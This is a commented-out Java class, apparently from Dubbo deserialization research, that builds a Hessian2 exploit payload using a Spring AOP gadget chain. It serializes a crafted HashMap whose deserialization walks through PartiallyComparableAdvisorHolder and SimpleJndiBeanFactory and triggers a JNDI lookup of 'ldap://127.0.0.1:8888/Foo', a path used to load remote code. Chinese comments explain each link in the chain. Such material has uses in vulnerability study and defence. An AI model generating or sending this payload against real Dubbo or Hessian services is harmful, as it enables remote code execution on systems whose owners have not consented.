//package com.arliya.dubbo.main;
//
//import com.caucho.hessian.io.*;
//import org.apache.commons.logging.impl.NoOpLog;
//import org.springframework.aop.aspectj.AbstractAspectJAdvice;
//import org.springframework.aop.aspectj.AspectInstanceFactory;
//import org.springframework.aop.aspectj.AspectJAroundAdvice;
//import org.springframework.aop.aspectj.AspectJPointcutAdvisor;
//import org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory;
//import org.springframework.aop.target.HotSwappableTargetSource;
//import org.springframework.jndi.support.SimpleJndiBeanFactory;
//import com.sun.org.apache.xpath.internal.objects.XString;
//import java.io.ByteArrayOutputStream;
//import java.lang.reflect.Array;
//import java.lang.reflect.Constructor;
//import java.util.HashMap;
//
//public class SerializeBySpringPartiallyComparableAdvisorHolder {
//    public static byte[] createPayload() throws Exception {
//        String jndiUrl = "ldap://127.0.0.1:8888/Foo";
//        SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
//        bf.setShareableResources(jndiUrl);
//
//        //反序列化时BeanFactoryAspectInstanceFactory.getOrder会被调用，会触发调用SimpleJndiBeanFactory.getType->SimpleJndiBeanFactory.doGetType->SimpleJndiBeanFactory.doGetSingleton->SimpleJndiBeanFactory.lookup->JndiTemplate.lookup
//        Reflections.setFieldValue(bf, "logger", new NoOpLog());
//        Reflections.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
//
//        //反序列化时AspectJAroundAdvice.getOrder会被调用，会触发BeanFactoryAspectInstanceFactory.getOrder
//        AspectInstanceFactory aif = Reflections.createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);
//        Reflections.setFieldValue(aif, "beanFactory", bf);
//        Reflections.setFieldValue(aif, "name", jndiUrl);
//
//        //反序列化时AspectJPointcutAdvisor.getOrder会被调用，会触发AspectJAroundAdvice.getOrder
//        AbstractAspectJAdvice advice = Reflections.createWithoutConstructor(AspectJAroundAdvice.class);
//        Reflections.setFieldValue(advice, "aspectInstanceFactory", aif);
//
//        //反序列化时PartiallyComparableAdvisorHolder.toString会被调用，会触发AspectJPointcutAdvisor.getOrder
//        AspectJPointcutAdvisor advisor = Reflections.createWithoutConstructor(AspectJPointcutAdvisor.class);
//        Reflections.setFieldValue(advisor, "advice", advice);
//
//        //反序列化时Xstring.equals会被调用，会触发PartiallyComparableAdvisorHolder.toString
//        Class<?> pcahCl = Class.forName("org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
//        Object pcah = Reflections.createWithoutConstructor(pcahCl);
//        Reflections.setFieldValue(pcah, "advisor", advisor);
//
//        //反序列化时HotSwappableTargetSource.equals会被调用，触发Xstring.equals
//        HotSwappableTargetSource v1 = new HotSwappableTargetSource(pcah);
//        HotSwappableTargetSource v2 = new HotSwappableTargetSource(new XString("xxx"));
//
//        //反序列化时HashMap.putVal会被调用，触发HotSwappableTargetSource.equals。这里没有直接使用HashMap.put设置值，直接put会在本地触发利用链，所以使用marshalsec使用了比较特殊的处理方式。
//        HashMap<Object, Object> s = new HashMap<>();
//        Reflections.setFieldValue(s, "size", 2);
//        Class<?> nodeC;
//        try {
//            nodeC = Class.forName("java.util.HashMap$Node");
//        }
//        catch ( ClassNotFoundException e ) {
//            nodeC = Class.forName("java.util.HashMap$Entry");
//        }
//        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
//        nodeCons.setAccessible(true);
//
//        // 避免序列化时触发gadget
//        Object tbl = Array.newInstance(nodeC, 2);
//        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
//        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
//        Reflections.setFieldValue(s, "table", tbl);
//
//
//        // hessian2序列化
//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//        Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);
//        NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
//        sf.setAllowNonSerializable(true);
//        hessian2Output.setSerializerFactory(sf);
//        hessian2Output.writeObject(s);
//        hessian2Output.flushBuffer();
//        return byteArrayOutputStream.toByteArray();
//    }
//}
